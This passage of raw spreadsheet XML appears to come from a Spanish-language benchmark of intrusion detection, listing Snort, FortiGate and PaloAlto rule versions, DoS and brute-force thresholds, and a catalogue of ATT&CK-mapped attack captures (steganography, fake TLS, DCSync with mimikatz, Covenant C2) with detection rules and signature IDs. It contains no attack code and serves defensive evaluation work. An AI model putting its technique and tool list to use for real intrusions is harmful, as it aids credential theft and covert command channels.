  <c r="AU127" i="3"/>
  <c r="AU128" i="3"/>
  <c r="AU129" i="3"/>
  <c r="AU130" i="3"/>
  <c r="AU131" i="3"/>
  <c r="AU132" i="3"/>
  <c r="AU133" i="3"/>
  <c r="AU134" i="3"/>
  <c r="AU135" i="3"/>
  <c r="AU136" i="3"/>
  <c r="AU137" i="3"/>
  <c r="AU138" i="3"/>
  <c r="AU139" i="3"/>
  <c r="AU3" i="3"/>
  <c r="B142" i="3" l="1"/>
  <c r="F1" i="13" s="1"/>
  <c r="EN139" i="3" l="1"/>
  <c r="AZ139" i="3"/>
  <c r="EN138" i="3"/>
  <c r="AZ138" i="3"/>
  <c r="EN137" i="3"/>
  <c r="AZ137" i="3"/>
  <c r="EN136" i="3"/>
  <c r="AZ136" i="3"/>
  <c r="EN135" i="3"/>
  <c r="AZ135" i="3"/>
  <c r="EN134" i="3"/>
  <c r="AZ134" i="3"/>
  <c r="EN133" i="3"/>
  <c r="DX133" i="3"/>
  <c r="AZ133" i="3"/>
  <c r="EN132" i="3"/>
  <c r="AZ132" i="3"/>
  <c r="EN131" i="3"/>
  <c r="AZ131" i="3"/>
  <c r="EN130" i="3"/>
  <c r="AZ130" i="3"/>
  <c r="EN129" i="3"/>
  <c r="AZ129" i="3"/>
  <c r="EN128" i="3"/>
  <c r="AZ128" i="3"/>
  <c r="EN127" i="3"/>
  <c r="AZ127" i="3"/>
  <c r="EN126" i="3"/>
  <c r="AZ126" i="3"/>
  <c r="EN125" i="3"/>
  <c r="AZ125" i="3"/>
  <c r="EN124" i="3"/>
  <c r="AZ124" i="3"/>
  <c r="EN123" i="3"/>
  <c r="EN122" i="3"/>
  <c r="AZ122" i="3"/>
  <c r="EN121" i="3"/>
  <c r="AZ121" i="3"/>
  <c r="EN120" i="3"/>
  <c r="AZ120" i="3"/>
  <c r="EN119" i="3"/>
  <c r="AZ119" i="3"/>
  <c r="EN118" i="3"/>
  <c r="AZ118" i="3"/>
  <c r="EN117" i="3"/>
  <c r="AZ117" i="3"/>
  <c r="EN116" i="3"/>
  <c r="AZ116" i="3"/>
  <c r="EN115" i="3"/>
  <c r="AZ115" i="3"/>
  <c r="EN114" i="3"/>
  <c r="AZ114" i="3"/>
  <c r="EN113" i="3"/>
  <c r="AZ113" i="3"/>
  <c r="EN112" i="3"/>
  <c r="AZ112" i="3"/>
  <c r="EN111" i="3"/>
  <c r="AZ111" i="3"/>
  <c r="EN110" i="3"/>
  <c r="AZ110" i="3"/>
  <c r="EN109" i="3"/>
  <c r="AZ109" i="3"/>
  <c r="EN108" i="3"/>
  <c r="AZ108" i="3"/>
  <c r="EN107" i="3"/>
  <c r="AZ107" i="3"/>
  <c r="EN106" i="3"/>
  <c r="AZ106" i="3"/>
  <c r="EN105" i="3"/>
  <c r="AZ105" i="3"/>
  <c r="EN104" i="3"/>
  <c r="AZ104" i="3"/>
  <c r="EN103" i="3"/>
  <c r="AZ103" i="3"/>
  <c r="EN102" i="3"/>
  <c r="AZ102" i="3"/>
  <c r="EN101" i="3"/>
  <c r="AZ101" i="3"/>
  <c r="EN100" i="3"/>
  <c r="AZ100" i="3"/>
  <c r="EN99" i="3"/>
  <c r="AZ99" i="3"/>
  <c r="EN98" i="3"/>
  <c r="AZ98" i="3"/>
  <c r="EN97" i="3"/>
  <c r="AZ97" i="3"/>
  <c r="EN96" i="3"/>
  <c r="AZ96" i="3"/>
  <c r="EN95" i="3"/>
  <c r="AZ95" i="3"/>
  <c r="EN94" i="3"/>
  <c r="EN93" i="3"/>
  <c r="EN92" i="3"/>
  <c r="EN91" i="3"/>
  <c r="EN90" i="3"/>
  <c r="EN89" i="3"/>
  <c r="EN88" i="3"/>
  <c r="AZ88" i="3"/>
  <c r="EN87" i="3"/>
  <c r="EN86" i="3"/>
  <c r="AZ86" i="3"/>
  <c r="EN85" i="3"/>
  <c r="AZ85" i="3"/>
  <c r="EN84" i="3"/>
  <c r="AZ84" i="3"/>
  <c r="EN83" i="3"/>
  <c r="EN82" i="3"/>
  <c r="EN81" i="3"/>
  <c r="AZ81" i="3"/>
  <c r="EN80" i="3"/>
  <c r="EN79" i="3"/>
  <c r="EN78" i="3"/>
  <c r="EN77" i="3"/>
  <c r="AZ77" i="3"/>
  <c r="EN76" i="3"/>
  <c r="AZ76" i="3"/>
  <c r="EN75" i="3"/>
  <c r="AZ75" i="3"/>
  <c r="EN74" i="3"/>
  <c r="AZ74" i="3"/>
  <c r="EN73" i="3"/>
  <c r="AZ73" i="3"/>
  <c r="EN72" i="3"/>
  <c r="AZ72" i="3"/>
  <c r="EN71" i="3"/>
  <c r="AZ71" i="3"/>
  <c r="EN70" i="3"/>
  <c r="AZ70" i="3"/>
  <c r="EN69" i="3"/>
  <c r="AZ69" i="3"/>
  <c r="EN68" i="3"/>
  <c r="AZ68" i="3"/>
  <c r="EN67" i="3"/>
  <c r="AZ67" i="3"/>
  <c r="EN66" i="3"/>
  <c r="AZ66" i="3"/>
  <c r="EN65" i="3"/>
  <c r="AZ65" i="3"/>
  <c r="EN64" i="3"/>
  <c r="AZ64" i="3"/>
  <c r="EN63" i="3"/>
  <c r="AZ63" i="3"/>
  <c r="EN62" i="3"/>
  <c r="AZ62" i="3"/>
  <c r="EN61" i="3"/>
  <c r="AZ61" i="3"/>
  <c r="EN60" i="3"/>
  <c r="AZ60" i="3"/>
  <c r="EN59" i="3"/>
  <c r="EN58" i="3"/>
  <c r="AZ58" i="3"/>
  <c r="EN57" i="3"/>
  <c r="AZ57" i="3"/>
  <c r="EN56" i="3"/>
  <c r="AZ56" i="3"/>
  <c r="EN55" i="3"/>
  <c r="EN54" i="3"/>
  <c r="EN53" i="3"/>
  <c r="EN52" i="3"/>
  <c r="AZ52" i="3"/>
  <c r="EN51" i="3"/>
  <c r="AZ51" i="3"/>
  <c r="EN50" i="3"/>
  <c r="AZ50" i="3"/>
  <c r="EN49" i="3"/>
  <c r="AZ49" i="3"/>
  <c r="EN48" i="3"/>
  <c r="AZ48" i="3"/>
  <c r="EN47" i="3"/>
  <c r="AZ47" i="3"/>
  <c r="EN46" i="3"/>
  <c r="AZ46" i="3"/>
  <c r="EN45" i="3"/>
  <c r="AZ45" i="3"/>
  <c r="EN44" i="3"/>
  <c r="EN43" i="3"/>
  <c r="AZ43" i="3"/>
  <c r="EN42" i="3"/>
  <c r="AZ42" i="3"/>
  <c r="EN41" i="3"/>
  <c r="EN40" i="3"/>
  <c r="AZ40" i="3"/>
  <c r="EN39" i="3"/>
  <c r="AZ39" i="3"/>
  <c r="EN38" i="3"/>
  <c r="AZ38" i="3"/>
  <c r="EN37" i="3"/>
  <c r="AZ37" i="3"/>
  <c r="EN36" i="3"/>
  <c r="AZ36" i="3"/>
  <c r="EN35" i="3"/>
  <c r="AZ35" i="3"/>
  <c r="EN34" i="3"/>
  <c r="AZ34" i="3"/>
  <c r="EN33" i="3"/>
  <c r="AZ33" i="3"/>
  <c r="EN32" i="3"/>
  <c r="AZ32" i="3"/>
  <c r="EN31" i="3"/>
  <c r="AZ31" i="3"/>
  <c r="EN30" i="3"/>
  <c r="AZ30" i="3"/>
  <c r="EN29" i="3"/>
  <c r="DA29" i="3"/>
  <c r="AZ29" i="3"/>
  <c r="EN28" i="3"/>
  <c r="AZ28" i="3"/>
  <c r="EN27" i="3"/>
  <c r="AZ27" i="3"/>
  <c r="EN26" i="3"/>
  <c r="AZ26" i="3"/>
  <c r="EN25" i="3"/>
  <c r="AZ25" i="3"/>
  <c r="EN24" i="3"/>
  <c r="AZ24" i="3"/>
  <c r="EN23" i="3"/>
  <c r="AZ23" i="3"/>
  <c r="EN22" i="3"/>
  <c r="AZ22" i="3"/>
  <c r="EN21" i="3"/>
  <c r="DX21" i="3"/>
  <c r="AZ21" i="3"/>
  <c r="EN20" i="3"/>
  <c r="AZ20" i="3"/>
  <c r="EN19" i="3"/>
  <c r="AZ19" i="3"/>
  <c r="EN18" i="3"/>
  <c r="EN17" i="3"/>
  <c r="AZ17" i="3"/>
  <c r="EN16" i="3"/>
  <c r="AZ16" i="3"/>
  <c r="EN15" i="3"/>
  <c r="AZ15" i="3"/>
  <c r="EN14" i="3"/>
  <c r="AZ14" i="3"/>
  <c r="EN13" i="3"/>
  <c r="AZ13" i="3"/>
  <c r="EN12" i="3"/>
  <c r="AZ12" i="3"/>
  <c r="EN11" i="3"/>
  <c r="AZ11" i="3"/>
  <c r="EN10" i="3"/>
  <c r="AZ10" i="3"/>
  <c r="EN9" i="3"/>
  <c r="CD9" i="3"/>
  <c r="AZ9" i="3"/>
  <c r="EN8" i="3"/>
  <c r="CD8" i="3"/>
  <c r="AZ8" i="3"/>
  <c r="EN7" i="3"/>
  <c r="AZ7" i="3"/>
  <c r="EN6" i="3"/>
  <c r="AZ6" i="3"/>
  <c r="EN5" i="3"/>
  <c r="AZ5" i="3"/>
  <c r="EN4" i="3"/>
  <c r="AZ4" i="3"/>
  <c r="EN3" i="3"/>
  <c r="AZ3" i="3"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="11877" uniqueCount="2857">
  <si>
    <t>SNORT</t>
  </si>
  <si>
    <t>Nombre REGLA</t>
  </si>
  <si>
    <t>Descripción</t>
  </si>
  <si>
    <t>Nº de Reglas</t>
  </si>
  <si>
    <t>Versión</t>
  </si>
  <si>
    <t>Fecha</t>
  </si>
  <si>
    <t>RS1</t>
  </si>
  <si>
    <t>RS2</t>
  </si>
  <si>
    <t>RS3</t>
  </si>
  <si>
    <t>RS4</t>
  </si>
  <si>
    <t>Talos Community</t>
  </si>
  <si>
    <t>Las "Talos Community Rules" o reglas de la Comunidad han sido creadas por miembros de la comunidad de código abierto o integrantes de Snort. Estas reglas están disponibles para todos los usuarios de Snort y están controladas por GPLv2. Constituye un subconjunto de las Reglas "Talos Registered".</t>
  </si>
  <si>
    <t>-</t>
  </si>
  <si>
    <t>✔</t>
  </si>
  <si>
    <t>Talos Registered</t>
  </si>
  <si>
    <t>ETOpen</t>
  </si>
  <si>
    <t>Conjunto de reglas "Emerging Threats" alternativas a las reglas ofrecidas por Snort, pero igualmente compatibles. Este paquete constituye un subconjunto de las reglas optimizadas Emerging Threats (ETOpen Optimizada).</t>
  </si>
  <si>
    <t>ETOpen Optimizada</t>
  </si>
  <si>
    <t>FORTIGATE</t>
  </si>
  <si>
    <t>Nombre Reglas</t>
  </si>
  <si>
    <t>IPS Definitions</t>
  </si>
  <si>
    <t>IPS Engine</t>
  </si>
  <si>
    <t>Dispositivo</t>
  </si>
  <si>
    <t>FortiGate</t>
  </si>
  <si>
    <t>FortiGate dispone de un conjunto de reglas internas que se van actualizando conforme se van exportando nuevas versiones completas del producto</t>
  </si>
  <si>
    <t>Version 28.00837</t>
  </si>
  <si>
    <t>Version 7.00539</t>
  </si>
  <si>
    <t>FGVM02</t>
  </si>
  <si>
    <t xml:space="preserve"> </t>
  </si>
  <si>
    <t>PALOALTO NGFW</t>
  </si>
  <si>
    <t>PaloAlto</t>
  </si>
  <si>
    <t>PaloAlto dispone de un conjunto de reglas internas que se van actualizando conforme se van exportando nuevas versiones completas del producto</t>
  </si>
  <si>
    <t>PAN-OS 10.2.11</t>
  </si>
  <si>
    <t>UMBRALES FUERZA BRUTA</t>
  </si>
  <si>
    <t>Threshold / Contador</t>
  </si>
  <si>
    <t>Duration (seconds)</t>
  </si>
  <si>
    <t>Action</t>
  </si>
  <si>
    <t>Monitor</t>
  </si>
  <si>
    <t>UMBRALES DOS</t>
  </si>
  <si>
    <t>L3 Anomalies</t>
  </si>
  <si>
    <t>Concepto</t>
  </si>
  <si>
    <t>ip_src_session</t>
  </si>
  <si>
    <t>ip_dst_session</t>
  </si>
  <si>
    <t>L4 Anomalies</t>
  </si>
  <si>
    <t>tcp_syn_flood</t>
  </si>
  <si>
    <t>tcp_port_scan</t>
  </si>
  <si>
    <t>tcp_src_session</t>
  </si>
  <si>
    <t>tcp_dst_session</t>
  </si>
  <si>
    <t>udp_flood</t>
  </si>
  <si>
    <t>udp_scan</t>
  </si>
  <si>
    <t>udp_src_session</t>
  </si>
  <si>
    <t>udp_dst_session</t>
  </si>
  <si>
    <t>icmp_flood</t>
  </si>
  <si>
    <t>icmp_sweep</t>
  </si>
  <si>
    <t>icmp_src_session</t>
  </si>
  <si>
    <t>icmp_dst_session</t>
  </si>
  <si>
    <t>sctp_flood</t>
  </si>
  <si>
    <t>sctp_scan</t>
  </si>
  <si>
    <t>sctp_src_session</t>
  </si>
  <si>
    <t>sctp_dst_session</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="10"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">¡ATENCIÓN! </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Los umbrales se han configurado de forma que puedan saltar para todos los ataques disponibles en el banco de ataques (relacionados con Denegaciones de Servicio o Fuerza Bruta). Es posible que en algún ataque no relacionado con esta temática pueda saltar alguna de estas alertas. Si se sospecha que no están relacionadas o que han podido saltar a causa de este bajo umbral se recomienda, o eliminar manualmente las alertas de los logs, o ajustar los umbrales a valores más elevados antes de la detección de estos ataques. En caso de ataques masivos o inmanejables en los que se desconoce su naturaleza completa, se recomienda acudir al recuadro de abajo.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="10"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">¡ATENCIÓN! </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Los umbrales de Fuerza Bruta y Denegación de Servicio requieren de un tiempo de reseteo. Si entre detecciones no se espera suficiente tiempo pueden generarse alertas de esta índole erróneamente. Se recomienda, por tanto, esperar un tiempo de al menos 5 minutos entre ataques, para evitar influencia de uno sobre el otro.</t>
    </r>
  </si>
  <si>
    <t>PALOALTO</t>
  </si>
  <si>
    <t>TÁCTICA</t>
  </si>
  <si>
    <t>OTRAS TÁCTICAS</t>
  </si>
  <si>
    <t>ID TÁCTICA</t>
  </si>
  <si>
    <t>TÉCNICA</t>
  </si>
  <si>
    <t>ID TÉCNICA</t>
  </si>
  <si>
    <t>SUBTÉCNICA</t>
  </si>
  <si>
    <t>ID SUBTÉCNICA</t>
  </si>
  <si>
    <t>ATAQUE</t>
  </si>
  <si>
    <t>HERRAMIENTA</t>
  </si>
  <si>
    <t>FICHERO PCAP</t>
  </si>
  <si>
    <t>PROTOCOLO BASE DE ATAQUE</t>
  </si>
  <si>
    <t>Nº TOTAL DE FLUJOS</t>
  </si>
  <si>
    <t>Nº DE MENSAJES DE RED CON ATAQUE/S</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TOTALES</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) PRINCIPALES</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) COLATERALES</t>
  </si>
  <si>
    <t>ATAQUE/S COLATERAL/ES - EXPLICACIÓN</t>
  </si>
  <si>
    <t>DETECTABLE POR PATRONES</t>
  </si>
  <si>
    <t>MECANISMO DE DETECCIÓN</t>
  </si>
  <si>
    <t>DETALLES DE IMPLEMENTACIÓN DE ATAQUE</t>
  </si>
  <si>
    <t>PROCESO DE GENERACIÓN DE PCAP</t>
  </si>
  <si>
    <t>VALIDACIÓN DE PCAP</t>
  </si>
  <si>
    <t>ANÁLISIS DE DETECCIONES DE PCAP (Snort)</t>
  </si>
  <si>
    <t>FORMATO PCAPNG</t>
  </si>
  <si>
    <t>ATAQUES COLATERALES</t>
  </si>
  <si>
    <t>VERIFICACIÓN MTU MÁXIMA</t>
  </si>
  <si>
    <t>ERROR TCP_REPLAY</t>
  </si>
  <si>
    <t>CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL</t>
  </si>
  <si>
    <t>NIVEL DE ATAQUE (Contexto de Ataque)</t>
  </si>
  <si>
    <t>JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque)</t>
  </si>
  <si>
    <t>NIVEL DE ATAQUE (MODELO OSI)</t>
  </si>
  <si>
    <t>TRAMAS &gt; 4000 Bytes</t>
  </si>
  <si>
    <t>SIDs (sin repetición)</t>
  </si>
  <si>
    <t>#SIDs</t>
  </si>
  <si>
    <t>Número total de alertas</t>
  </si>
  <si>
    <t>SIDs en legítimo y ataque</t>
  </si>
  <si>
    <t>SIDs sólo en ataque - SIDs TP ( Automático)</t>
  </si>
  <si>
    <t>#SIDs TP (Automático)</t>
  </si>
  <si>
    <t>SIDs FP (Manual)</t>
  </si>
  <si>
    <t>SIDs FP (Automático)</t>
  </si>
  <si>
    <t>SIDs FP</t>
  </si>
  <si>
    <t>SIDs FP "No Relacionados"</t>
  </si>
  <si>
    <t>SIDs FP "Eventos de Red"</t>
  </si>
  <si>
    <t>SIDs TP "Todas las Alertas" (Manual)</t>
  </si>
  <si>
    <t>SIDs TP "Algunas Alertas"(Manual)</t>
  </si>
  <si>
    <t>#SIDs TP (Manual)</t>
  </si>
  <si>
    <t>Nº TOTAL DE FLUJOS DETECTADOS SNORTv3</t>
  </si>
  <si>
    <t>Nº TOTAL DE FLUJOS CON ATAQUE/S TOTALES DETECTADOS</t>
  </si>
  <si>
    <t>Nº DE MENSAJES DE RED CON ATAQUE/S TOTALES DETECTADOS</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TOTALES DETECTADOS</t>
  </si>
  <si>
    <t>Nº TOTAL DE FLUJOS CON ATAQUE/S TP DETECTADOS (Manual)</t>
  </si>
  <si>
    <t>Nº DE MENSAJES DE RED CON ATAQUE/S TP DETECTADOS (Manual)</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TP DETECTADOS (Manual)</t>
  </si>
  <si>
    <t>Nº TOTAL DE FLUJOS CON ATAQUE/S TP DETECTADOS (Automático)</t>
  </si>
  <si>
    <t>Nº DE MENSAJES DE RED CON ATAQUE/S TP DETECTADOS (Automático)</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TP DETECTADOS (Automático)</t>
  </si>
  <si>
    <t>% DETECCIÓN FLUJOS</t>
  </si>
  <si>
    <t>% DETECCIÓN FLUJOS TP (Automático)</t>
  </si>
  <si>
    <t>% DETECCIÓN FLUJOS TP (Manual)</t>
  </si>
  <si>
    <t>% DETECCIÓN MENSAJES</t>
  </si>
  <si>
    <t>%DETECCIÓN MENSAJES TP (Automático)</t>
  </si>
  <si>
    <t>%DETECCIÓN MENSAJES TP (Manual)</t>
  </si>
  <si>
    <t>% DETECCIÓN INSTANCIAS</t>
  </si>
  <si>
    <t>% DETECCIÓN INSTANCIAS TP (Automático)</t>
  </si>
  <si>
    <t>% DETECCIÓN INSTANCIAS TP (Manual)</t>
  </si>
  <si>
    <t>% DETECCIÓN EFICAZ FLUJOS (Manual)</t>
  </si>
  <si>
    <t>% DETECCIÓN EFICAZ ATAQUES (Manual)</t>
  </si>
  <si>
    <t>SIDs TP "Todas las Alertas"</t>
  </si>
  <si>
    <t>SIDs TP "Algunas Alertas"</t>
  </si>
  <si>
    <t>Nº TOTAL DE FLUJOS DETECTADOS SNORTv2</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) DETECTADOS POR TALOS</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) DETECTADOS POR ETOPEN</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TP DETECTADOS POR TALOS (Automático)</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TP DETECTADOS POR ETOPEN (Automático)</t>
  </si>
  <si>
    <t>Nº ATAQUES (INSTANCIAS) TP TOTALES DETECTADOS (Automático + Manual)</t>
  </si>
  <si>
    <t>% DETECCIÓN TP INSTANCIAS (Automático + Manual)</t>
  </si>
  <si>
    <t>% DETECCIÓN TP INSTANCIAS (Manual)</t>
  </si>
  <si>
    <t>COMENTARIOS DE LAS DETECCIONES SNORT</t>
  </si>
  <si>
    <t>Attackids (sin repetición)</t>
  </si>
  <si>
    <t>#Attackid</t>
  </si>
  <si>
    <t>Attackids FP Dataset_Legítimo_TD</t>
  </si>
  <si>
    <t>#Attackids FP Dataset_Legítimo_TD</t>
  </si>
  <si>
    <t>Attackids FP Dataset_Legítimo_Basico</t>
  </si>
  <si>
    <t>#Attackids FP Dataset_Legítimo_Basico</t>
  </si>
  <si>
    <t>Attackids FP (Manual)</t>
  </si>
  <si>
    <t>Attackids TP (Manual)</t>
  </si>
  <si>
    <t>Attackids TP (Automático)</t>
  </si>
  <si>
    <t>Attackids FP Totales</t>
  </si>
  <si>
    <t>#Attackids FP Totales</t>
  </si>
  <si>
    <t>App (Control de Aplicaciones)</t>
  </si>
  <si>
    <t>COMENTARIOS DE LAS DETECCIONES FG</t>
  </si>
  <si>
    <t>DETECTABLE POR FG</t>
  </si>
  <si>
    <t>Nº FLUJOS IDENTIFICADOS POR FORTIGATE</t>
  </si>
  <si>
    <t>Nº FLUJOS CON ATAQUE DETECTADOS POR FORTIGATE - IPS</t>
  </si>
  <si>
    <t>Nº FLUJOS CON ATAQUE DETECTADOS POR FORTIGATE - Control de Aplicaciones</t>
  </si>
  <si>
    <t>Nº FLUJOS CON ATAQUE EFICAZMENTE DETECTADOS</t>
  </si>
  <si>
    <t>% DETECCIÓN FLUJOS FORTIGATE</t>
  </si>
  <si>
    <t>% DETECCIÓN EFICAZ FLUJOS FORTIGATE</t>
  </si>
  <si>
    <t>% DETECCIÓN EFICAZ ATAQUE FORTIGATE</t>
  </si>
  <si>
    <t>threat_id (sin repetición)</t>
  </si>
  <si>
    <t>#threat_id</t>
  </si>
  <si>
    <t>threat_ids FP Dataset_Legítimo_TD</t>
  </si>
  <si>
    <t>#threat_ids FP Dataset_Legítimo_TD</t>
  </si>
  <si>
    <t>threat_ids FP Dataset_Legítimo_Basico</t>
  </si>
  <si>
    <t>#threat_ids FP Dataset_Legítimo_Basico</t>
  </si>
  <si>
    <t>threat_ids TP (Manual)</t>
  </si>
  <si>
    <t>threat_ids FP (Manual)</t>
  </si>
  <si>
    <t>threat_ids FP Totales</t>
  </si>
  <si>
    <t>#threat_ids FP Totales</t>
  </si>
  <si>
    <t>COMENTARIOS DE LAS DETECCIONES PA</t>
  </si>
  <si>
    <t>DETECTABLE POR PALOALTO</t>
  </si>
  <si>
    <t>Nº FLUJOS IDENTIFICADOS POR PALOALTO</t>
  </si>
  <si>
    <t>% DETECCIÓN FLUJOS CON ATAQUE PALOALTO</t>
  </si>
  <si>
    <t>Command and Control</t>
  </si>
  <si>
    <t>TA0040</t>
  </si>
  <si>
    <t>Data Obfuscation</t>
  </si>
  <si>
    <t>T1001</t>
  </si>
  <si>
    <t>Steganography</t>
  </si>
  <si>
    <t>T1001.002</t>
  </si>
  <si>
    <t>Inserción de información confidencial en una imagen JPG</t>
  </si>
  <si>
    <t>Covenant, SSH, scp, Powershell</t>
  </si>
  <si>
    <t>T1001.002-Data_obfuscation_steganography_[4].pcapng</t>
  </si>
  <si>
    <t>SSH</t>
  </si>
  <si>
    <t>NO</t>
  </si>
  <si>
    <t xml:space="preserve">Detección por anomalías y/o estegoanálisis, envío de imágenes o ficheros con formato poco común entre equipos, existencia de ficheros comprimidos sospechosos, etc. </t>
  </si>
  <si>
    <t>Manual [4] /  3.18</t>
  </si>
  <si>
    <t>Manual [4] / B.18</t>
  </si>
  <si>
    <t>Manual [4] / 4.18</t>
  </si>
  <si>
    <t>SI</t>
  </si>
  <si>
    <t>✘</t>
  </si>
  <si>
    <t>LV1</t>
  </si>
  <si>
    <t>El uso de técnicas esteganográficas para ocultar datos es unívoca. No puede confundirse con actividad legítima</t>
  </si>
  <si>
    <t>L3</t>
  </si>
  <si>
    <t>2002752, 2002749</t>
  </si>
  <si>
    <t>0</t>
  </si>
  <si>
    <t>Protocol Impersonation</t>
  </si>
  <si>
    <t>T1001.003</t>
  </si>
  <si>
    <t>Falsificación de protocolos de conexión segura como SSL o TLS</t>
  </si>
  <si>
    <t>FakeTLS (raykaryshyn Github)</t>
  </si>
  <si>
    <t>T1001.003-Data_obfuscation_protocol_impersonation_[4].pcapng</t>
  </si>
  <si>
    <t>TLS</t>
  </si>
  <si>
    <t>Regla genérica que analice el contenido y la estructura de los paquetes enviados para detectar una falsificación de protocolo. Adicionalmente se puede detectar con una regla personalizada que compruebe el campo Server Name y mediante DNS asegure si se corresponde con la dirección IP a la que se está accediendo.</t>
  </si>
  <si>
    <t>Manual [4] /  3.17</t>
  </si>
  <si>
    <t>Manual [4] / B.17</t>
  </si>
  <si>
    <t>Manual [4] / 4.17</t>
  </si>
  <si>
    <t>La falsificación del protocolo TLS para acceder al equipo víctima es únivoca. No puede confundirse con actividad legítima.</t>
  </si>
  <si>
    <t>20022752, 2002749</t>
  </si>
  <si>
    <t>14978, 9999</t>
  </si>
  <si>
    <t>Credential Access</t>
  </si>
  <si>
    <t>TA0006</t>
  </si>
  <si>
    <t>OS Credential Dumping</t>
  </si>
  <si>
    <t>T1003</t>
  </si>
  <si>
    <t>DCSync</t>
  </si>
  <si>
    <t>T1003.006</t>
  </si>
  <si>
    <t>Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory)</t>
  </si>
  <si>
    <t>mimikazt</t>
  </si>
  <si>
    <t>T1003-Os_credential_dumping_dcsync_[4].pcapng</t>
  </si>
  <si>
    <t>DCERPC</t>
  </si>
  <si>
    <t>Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges</t>
  </si>
  <si>
    <t>Manual [4] /  3.11</t>
  </si>
  <si>
    <t>Manual [4] / B.11</t>
  </si>
  <si>
    <t>Manual [4] / 4.11</t>
  </si>
  <si>
    <t>La obtención de credenciales del usuario krbtgt de manera no autorizada supone siempre un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 41701</t>
  </si>
  <si>
    <t>92322, 54406</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujos detectados PA</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">:  </t>
    </r>
  </si>
  <si>
    <t>Fallback Channels</t>
  </si>
  <si>
    <t>T1008</t>
  </si>
  <si>
    <t>Traspaso de canal primario C2 a canal alternativo</t>
  </si>
  <si>
    <t>Covenant</t>
  </si>
  <si>
    <t>T1008-Fallback_channels_[4].pcapng</t>
  </si>
  <si>
    <t>SMB2</t>
  </si>
  <si>
    <t>Establecimiento del canal C&amp;C primario mediante Covenant - Command and Control</t>
  </si>
  <si>
    <t>SI*</t>
  </si>
  <si>
    <t>La detección de la creación del canal es posible para este caso concreto, en el que el cortafuegos detecta la creación de ambos canales. Sin embargo, si ambos canales, tanto primario como secundario están establecidos, y no se ha detectado su creación, el cambio de uno a otro es inapreciable por el cortafuegos.</t>
  </si>
  <si>
    <t>Manual [4] /  3.19</t>
  </si>
  <si>
    <t>Manual [4] / B.19</t>
  </si>
  <si>
    <t>Manual [4] / 4.19</t>
  </si>
  <si>
    <t>La creación de un canal secundario de C&amp;C siempre es un ataque</t>
  </si>
  <si>
    <t>2027792, 2027793, 2027326</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="7"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2027792, 2027793, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027326</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2027792, 2027793, 2027326, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44489</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027792, 2027793, 2027326</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2027792, 2027793, 2027326, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>44489</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
